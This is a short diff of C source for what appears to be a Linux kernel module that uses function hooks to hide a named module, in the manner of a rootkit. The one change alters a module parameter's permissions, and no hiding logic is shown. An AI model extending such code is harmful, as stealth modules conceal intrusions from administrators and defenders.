@@ -13,7 +13,7 @@
 void callback_func_base(struct pt_regs *regs, unsigned long parent_ip, unsigned long func_pointer);
 
 static char *mod_name_to_hide;
-module_param(mod_name_to_hide, charp, 0);
+module_param(mod_name_to_hide, charp, 0600);
 static char *sys_modules_path = "/sys/module/";
 
 #pragma region hook_consts
